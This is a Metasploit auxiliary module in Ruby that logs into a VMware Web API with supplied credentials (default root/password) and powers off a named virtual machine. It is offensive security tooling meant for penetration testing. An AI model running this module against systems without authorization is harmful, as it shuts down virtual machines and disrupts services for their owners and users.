##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::VIMSoap

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'VMWare Power Off Virtual Machine',
            'Description'    => %Q{
              This module will log into the Web API of VMWare and try to power off
              a specified Virtual Machine.
            },
            'Author'         => ['theLightCosine'],
            'License'        => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [ true, "The username to Authenticate with.", 'root' ]),
        OptString.new('PASSWORD', [ true, "The password to Authenticate with.", 'password' ]),
        OptString.new('VM', [true, "The VM to try to Power Off"])
      ], self.class)

    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])
  end

  def run
    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success
      vm_ref = vim_find_vm_by_name(datastore['VM'])
      case vm_ref
      when String
        return_state = vim_powerOFF_vm(vm_ref)
        case return_state
        when 'success'
          print_good "VM Powered Off Successfully"
        when 'alreadyOFF'
          print_status "The Server says that VM #{datastore['VM']} is already off."
        else
          print_error "The server returned an unexpected status #{return_state}"
        end
      when :noresponse
        print_error "The request timed out"
      when :error
        print_error @vim_soap_error
      when nil
        print_error "Could not locate VM #{datastore['VM']}"
      end
    else
      print_error "Login Failure on #{datastore['RHOST']}"
      return
    end
  end
end
